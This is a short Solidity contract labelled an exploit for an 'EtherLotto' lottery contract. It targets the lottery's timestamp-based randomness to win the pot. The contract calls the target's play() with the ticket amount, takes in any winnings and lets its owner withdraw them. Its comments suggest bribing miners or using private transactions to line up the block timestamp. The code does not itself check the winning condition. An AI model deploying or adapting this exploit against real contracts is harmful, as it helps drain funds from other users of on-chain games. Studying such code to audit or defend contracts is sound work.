pragma solidity ^0.4.15;

/// @title Exploit for EtherLotto
/// @notice Exploits timestamp randomness to win pot

interface IEtherLotto {
    function play() external payable;
}

contract ExploitLotto {
    IEtherLotto public target;
    address public owner;

    constructor(address _target) public {
        target = IEtherLotto(_target);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value == 10); // Match TICKET_AMOUNT

        // Try calling play() until winning condition is met
        // Miners can be bribed or private tx can be used to get timestamp aligned
        target.play.value(10)();
    }

    function() external payable {
        // Accept pot if we win
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

